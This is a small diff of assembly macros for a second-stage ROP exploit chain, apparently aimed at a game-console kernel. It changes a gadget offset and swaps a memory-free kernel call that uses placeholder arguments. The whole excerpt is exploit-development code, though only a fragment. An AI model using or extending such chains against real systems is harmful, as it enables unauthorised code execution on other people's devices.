@@ -133,14 +133,14 @@
         # Gadget N: write CipherTextScratchBuffer address into gadget data below
         #
         ###########################################################
-        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r3_offset) - _second_stage_chain_start, CipherTextScratchBuffer
+        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r4_offset) - _second_stage_chain_start, CipherTextScratchBuffer
         
         ###########################################################
         # Gadget N: call XPhysicalFree and free the scratch buffer
         #
         #   r3 = scratch buffer address (to be filled in by gadgets above)
         ###########################################################
-        CALL_FUNC 1, XPhysicalFree, R3H=0, R3L=0x41414141
+        CALL_FUNC 1, MmFreePhysicalMemory, R3H=0, R3L=0, R4H=0, R4L=0x41414141
         
         ###########################################################
         # Gadget N: epilogue to be implemented by the caller
